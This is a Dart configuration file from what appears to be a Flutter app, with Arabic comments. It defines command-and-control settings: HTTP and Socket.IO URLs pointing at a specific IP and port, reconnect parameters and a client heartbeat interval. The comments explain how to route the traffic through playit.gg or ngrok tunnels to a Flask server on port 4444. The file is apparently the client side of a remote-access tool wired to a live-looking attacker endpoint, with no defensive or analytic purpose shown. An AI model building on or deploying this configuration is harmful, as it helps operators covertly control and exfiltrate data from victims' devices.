// lib/config/app_config.dart

// !! هام: في بيئة حقيقية، استخدم متغيرات البيئة أو تقنيات إدارة الأسرار
// لا تضع عناوين IP أو نطاقات حقيقية هنا مباشرة في التحكم بالمصادر (Version Control)
// هذا مجرد مثال توضيحي. استبدله بعنوان IP والمنفذ لخادم Python الخاص بك
// أو استخدم placeholder واضبطه عند التشغيل.

// --- HTTP Server Configuration ---
// يجب أن يشير هذا إلى العنوان الذي يوفره playit.gg أو ngrok
// والذي بدوره يوجه إلى Flask HTTP server (e.g., localhost:4444)
const String C2_HTTP_SERVER_URL =
    'http://147.185.221.28:35357'; // <--- استبدل هذا بالعنوان الصحيح لإرسال HTTP!

// --- WebSocket (Socket.IO) Server Configuration ---
// عادةً ما يكون نفس المضيف والمنفذ لـ HTTP إذا كان الخادم يدعم ترقية الاتصال،
// أو إذا كنت تستخدم نفس النفق (Tunnel) لكليهما.
// تأكد أن النفق (playit.gg/ngrok) الذي تستخدمه يدعم TCP لاتصالات WebSocket.
// playit.gg عادةً ما ينشئ tunnel منفصل لـ TCP إذا لم يكن HTTP(S) كافياً.
// استخدم 'ws://' لـ non-SSL و 'wss://' لـ SSL.
// Flask's built-in server + SocketIO does not handle SSL out of the box without extra setup (like a reverse proxy).
const String C2_SOCKET_IO_URL =
    'ws://147.185.221.28:35357'; // <--- استبدل هذا بالعنوان الصحيح لـ Socket.IO!
// إذا كان playit.gg يعطيك عنوان ومنفذ TCP منفصل، استخدمه هنا.
// وإلا، إذا كان النفق HTTP(S) من ngrok يمكنه ترقية WebSockets،
// فقد يكون هذا هو نفس عنوان HTTP (مع تغيير البروتوكول إلى ws/wss).

// مثال لـ Ngrok: إذا كان Ngrok يوفر http://random.ngrok.io -> localhost:4444
//                    فإن Socket.IO قد يكون ws://random.ngrok.io (أو wss:// إذا كان النفق HTTPS)
// مثال لـ Playit.gg: إذا كان لديك tunnel من نوع "TCP + UDP" أو "TCP" يشير إلى منفذ 4444،
//                     استخدم الـ address:port الذي يظهره playit.gg هنا مع 'ws://'.
//                     إذا كنت تعتمد على tunnel من نوع "HTTP/HTTPS" من Playit، تأكد أنه يدعم ترقية Websocket.

const Duration C2_SOCKET_IO_RECONNECT_DELAY = Duration(seconds: 5);
const int C2_SOCKET_IO_RECONNECT_ATTEMPTS = 5;
const Duration C2_HEARTBEAT_INTERVAL = Duration(
  seconds: 45,
); // Interval for client to send heartbeat
